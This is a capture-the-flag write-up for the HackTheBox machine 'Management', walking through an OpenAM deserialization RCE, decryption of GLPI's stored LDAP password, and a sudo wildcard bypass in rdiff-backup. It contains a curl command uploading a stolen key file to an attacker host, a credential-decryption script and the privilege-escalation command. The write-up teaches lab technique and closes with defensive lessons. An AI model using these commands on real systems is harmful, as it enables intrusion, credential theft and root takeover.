---
title: HackTheBox - Management
date: 2026-11-15
image: cover.png
tags: [HackTheBox, Easy, Linux]
platform: HackTheBox
os: Linux
difficulty: Easy
points: 45
released: 2025-07-29
ip: 10.129.244.176
boxAvatar: htb-cover.png
excerpt: An easy Linux box for a fictional managed-services provider. Its SSO portal runs OpenAM 16.0.5, vulnerable to a pre-authentication deserialization RCE (CVE-2026-33439) that hands over a shell as the openam service account. From there, GLPI's database credentials lead to an LDAP bind password encrypted with libsodium XChaCha20-Poly1305 - decrypting it with the on-disk key file pivots to a real user. A permissive sudo rule for rdiff-backup, whose wildcard lets the restricted path be overridden, copies root's home directory and finishes the box.
---

# Management

Management is an easy-rated Linux machine for a fictional managed-services provider running an identity stack (OpenAM), a helpdesk (GLPI) and a backup tool all on one host. The SSO portal exposes OpenAM 16.0.5, which is vulnerable to a pre-authentication deserialization RCE that lands a shell as the `openam` service account. From there, GLPI's database holds an LDAP bind password encrypted with libsodium — decrypting it with the key file already on disk pivots to a real user. Root comes from a sudo rule for `rdiff-backup` whose trailing wildcard lets an attacker override the `--restrict-path` directive and mirror the entire root home directory. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

### NMAP Scanning

The certificate body below is trimmed to its metadata.

```bash
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.244.176/
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Issuer: commonName=management.htb/organizationName=Management Managed Services Ltd
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-02T01:21:44
| Not valid after:  2126-05-09T01:21:44
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://management.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH and an nginx web server on ports 80 and 443, with both HTTP ports redirecting to HTTPS. The certificate covers `*.management.htb` as well — a wildcard SAN that hints at additional virtual hosts.

### SSH - Banner Grabbing

→ Command: `nc -vn 10.129.244.176 22`

{% image %}

```bash
➜  management nc -vn 10.129.244.176 22
(UNKNOWN) [10.129.244.176] 22 (ssh) open
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.19
```

### Web Server Enumeration

The nmap output already shows a redirect to `management.htb`, so we add it to `/etc/hosts`:

```bash
➜  management cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.244.176	management.htb
```

{% image2 %}

The main page has a "Client login" button that redirects to `sso.management.htb`, so we add that to `/etc/hosts` as well:

{% image3 %}

Since we found one subdomain organically, we run a full subdomain scan to make sure we haven't missed any:

```bash
ffuf -u http://management.htb/ -H 'Host: FUZZ.management.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --fs 178
```

Nothing beyond `sso` comes back:

{% image4 %}

### SSO - OpenAM Enumeration

The SSO subdomain hosts an OpenAM Community Edition instance:

{% image5 %}

Viewing the page source reveals the version — `v=16.0.5` — in the RequireJS configuration:

{% image6 %}

This version is affected by CVE-2026-33439, a pre-authentication remote code execution via `jato.clientSession` deserialization. A public proof of concept is available at [stapat1245/CVE-2026-33439_poc](https://github.com/stapat1245/CVE-2026-33439_poc):

{% image7 %}

We use it to send a reverse-shell payload generated with [revshells.com](https://www.revshells.com/) and catch it on our listener:

{% image8 %}

### Privilege Escalation - Pillaging and Situational Awareness

After stabilizing the shell we transfer `linpeas.sh` to the box:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 21 columns 115
```

{% image9 %}

The `/opt` directory holds several interesting services:

```bash
openam@management:/opt$ ls -lah
ls -lah
total 36K
drwxr-xr-x  9 root     root     4.0K Sep  7 11:41 .
drwxr-xr-x 23 root     root     4.0K Sep  7 11:41 ..
drwxr-xr-x  4 www-data www-data 4.0K Sep  7 11:41 backup
drwxr-xr-x  3 root     root     4.0K Sep  7 11:41 backups
drwxr-xr-x 22 www-data www-data 4.0K Sep  7 11:41 glpi
drwxr-x---  4 openam   openam   4.0K Nov  3 18:33 openam
drwxr-xr-x  9 openam   openam   4.0K Sep  7 11:41 openam-tomcat
drwxr-xr-x  5 root     root     4.0K Sep  7 11:41 sysinternalsEBPF
drwx------  2 root     root     4.0K Nov  3 15:46 sysmon
```

The interesting one is `glpi` — an IT service management platform that integrates with LDAP for centralized authentication. Inside `/opt/glpi/config` we find `config_db.php` with the database credentials, and `glpicrypt.key` — the key GLPI uses to encrypt sensitive fields:

{% image10 %}

We connect to MariaDB with the credentials from the config:

```bash
mysql -u glpi -h localhost -p
```

{% image11 %}

The `glpi_authldaps` table holds the LDAP bind configuration, including the server address (`sso.management.htb`), the bind DN (`cn=svc-glpi,ou=services,dc=management,dc=htb`), and an encrypted password:

{% image12 %}

The password looks like base64, but it's actually encrypted with libsodium XChaCha20-Poly1305 (GLPI 10.x `sodiumEncrypt`). The 52-byte decoded blob is a 24-byte nonce followed by 28 bytes of ciphertext and MAC. GLPI's own source confirms that it passes the nonce as AAD:

{% image13 %}

We write a Python decryption script that reads the on-disk key and decrypts the blob:

```python
import base64
from nacl.bindings import crypto_aead_xchacha20poly1305_ietf_decrypt
from nacl.exceptions import CryptoError

# 1. Read the key (must be exactly 32 bytes for XChaCha20-Poly1305)
with open('/opt/glpi/config/glpicrypt.key', 'rb') as f:
    key = f.read()

# 2. Decode the ciphertext
ciphertext_b64 = 'avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw=='
blob = base64.b64decode(ciphertext_b64)

# 3. Extract the nonce (first 24 bytes) and the actual encrypted data
NONCE_SIZE = 24
nonce = blob[:NONCE_SIZE]
data = blob[NONCE_SIZE:]

# 4. Decrypt (Note: GLPI uses the nonce as AAD)
try:
    plaintext = crypto_aead_xchacha20poly1305_ietf_decrypt(
        data,      # ciphertext
        nonce,     # AAD (Additional Authenticated Data) - GLPI passes nonce here
        nonce,     # nonce
        key        # 32-byte key
    )
    print(plaintext.decode('utf-8', errors='replace'))
except CryptoError as e:
    print(f"Decryption failed: {e}")
    print("This usually means the key is wrong, or the data is not a GLPI encrypted blob.")
```

First we exfiltrate the key file using `simplehttpserver` from ProjectDiscovery:

```bash
./simplehttpserver -basic-auth root:root -upload # Our machine
curl -v --user 'root:root' --upload-file ./glpicrypt.key http://10.10.14.11:8000/glpicrypt.key # Attacked machine
```

{% image14 %}

Running the decryption script reveals the LDAP bind password:

{% image15 %}

`netexec` confirms it works as `owen`'s SSH credentials:

{% image16 %}

### Privilege Escalation - Root

Checking sudo permissions, `owen` can run `rdiff-backup` as root with no password:

{% image17 %}

The rule is:

```
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

The trailing wildcard means any additional arguments can be appended after the fixed ones. The key insight is that `rdiff-backup`'s `--restrict-path` can be specified more than once, and the last one wins. By using `--remote-schema` to invoke the sudo command and appending a second `--restrict-path` pointing at `/`, the read-only restriction is widened to the entire file system:

```bash
/usr/bin/rdiff-backup --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" backup /::/root /tmp/root_backup
```

{% image18 %}

Root's entire home directory is now mirrored under `/tmp/root_backup`, including the flag and the SSH private key for persistence:

{% image19 %}

Management shows how a single misconfigured wildcard in a sudo rule can undo an otherwise well-layered stack. The OpenAM deserialization hands over the initial foothold, but the escalation path is more subtle: the GLPI key file sitting alongside its encrypted LDAP password is exactly the same as storing a password in plaintext — anyone who can read both has the credential. And the `rdiff-backup` rule intended to limit reads to `/opt/backup` falls apart the moment a second `--restrict-path` can be appended through the wildcard, a reminder that sudo wildcards and tools with repeatable flags are a dangerous combination.
